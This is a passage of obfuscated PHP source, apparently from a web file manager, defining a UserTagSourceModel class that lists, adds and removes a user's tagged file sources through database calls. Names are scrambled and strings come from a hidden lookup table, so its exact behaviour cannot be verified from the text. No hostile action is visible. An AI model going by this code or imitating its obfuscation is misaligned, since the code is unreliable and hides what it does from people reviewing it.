$Û´‚ñÍ = get_path_this($Å¸‡“Ìø); if (isset($¤’æ•Ú¥[$Û´‚ñÍ]) || !file_exists($Å¸‡“Ìø . $²ìòåÔ[2090]) || !file_exists($Å¸‡“Ìø . $²ìòåÔ[2079])) { continue; } Hook::apply($Û´‚ñÍ . $²ìòåÔ[2084]); } } } goto Dç¾‘ŸœâË; EÁÓÉï”ÍÜ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\146\141\x76"; protected function cacheFunctionAlias($¤÷ÇÖù¿) { $ÆÄ®Îï¥ =& $_SERVER[Ñ¯©ç]; return array($ÆÄ®Îï¥[2067] => array($ÆÄ®Îï¥[2479] . USER_ID, $ÆÄ®Îï¥[2068])); } protected function listData() { $‹¶°ˆ±î =& $_SERVER[Ñ¯©ç]; $ÂôÃ¯û = array($‹¶°ˆ±î[1748] => USER_ID, $‹¶°ˆ±î[541] => array($‹¶°ˆ±î[2071], 0)); $ŸÊÙºãÈ = $‹¶°ˆ±î[2480]; $€÷âçóœ = $this->field($ŸÊÙºãÈ)->where($ÂôÃ¯û)->order($‹¶°ˆ±î[2074])->select(); return $€÷âçóœ ? $€÷âçóœ : array(); } protected function addToTag($ÁÄ¶É‡¤, $øÔäœËò) { $ §ø• =& $_SERVER[Ñ¯©ç]; if (!Model($ §ø•[2218])->listData($øÔäœËò)) { return !1; } if (is_numeric($ÁÄ¶É‡¤)) { $öôö×Ğ¡ = Model($ §ø•[877])->pathInfo($ÁÄ¶É‡¤); if (!$öôö×Ğ¡) { return !1; } } else { $öôö×Ğ¡ = IO::infoSimple($ÁÄ¶É‡¤); if (!$öôö×Ğ¡) { return !1; } $–Ó¼ùæ = $öôö×Ğ¡[$ §ø•[32]]; $É¿Ã³å = $öôö×Ğ¡[$ §ø•[33]]; if (isset($öôö×Ğ¡[$ §ø•[468]])) { $É¿Ã³å = $öôö×Ğ¡[$ §ø•[468]] == $ §ø•[101] ? $ §ø•[88] : $ §ø•[231]; } } $ï±òõ³ô = array($ §ø•[1748] => USER_ID, $ §ø•[541] => $øÔäœËò, $ §ø•[478] => $ÁÄ¶É‡¤, $ §ø•[479] => $É¿Ã³å ? $É¿Ã³å : $ §ø•[473], $ §ø•[477] => $–Ó¼ùæ ? $–Ó¼ùæ : $ §ø•[12], $ §ø•[1959] => 0); if ($this->where($ï±òõ³ô)->find()) { return !1; } return $this->add($ï±òõ³ô); } protected function removeFromTag($æÅŞ¢’, $å¶œ«ºã) { $ÛÑş¾¢ =& $_SERVER[Ñ¯©ç]; if (!Model($ÛÑş¾¢[2218])->listData($å¶œ«ºã)) { return !1; } if (is_array($æÅŞ¢’)) { $æÅŞ¢’ = array($ÛÑş¾¢[7], $æÅŞ¢’); } $ã¼ºÂ = array($ÛÑş¾¢[1748] => USER_ID, $ÛÑş¾¢[541] => $å¶œ«ºã, $ÛÑş¾¢[478] => $æÅŞ¢’); return $this->where($ã¼ºÂ)->delete(); } protected function removeByTag($ìª‰„Ô¢) { $Éæ…ô¿Î =& $_SERVER[Ñ¯©ç]; if (!$ìª‰„Ô¢) { return !1; } $Ö µ½—Ì = array($Éæ…ô¿Î[1748] => USER_ID, $Éæ…ô¿Î[541] => $ìª‰„Ô¢); return $this->where($Ö µ½—Ì)->delete(); } protected function removeBySource($õÈÈöÍŞ) { $ÇœÛª“£ =& $_SERVER[Ñ¯©ç]; if (is_array($õÈÈöÍŞ)) { $õÈÈöÍŞ = array($ÇœÛª“£[7], $õÈÈöÍŞ); } $¡ª”±Ğ× = array($ÇœÛª“£[1748] => USER_ID, $ÇœÛª“£[541] => array($ÇœÛª“£[1067], 0), $ÇœÛª“£[478] => $õÈÈöÍŞ); return $this->where($¡ª”±Ğ×)->delete(); } }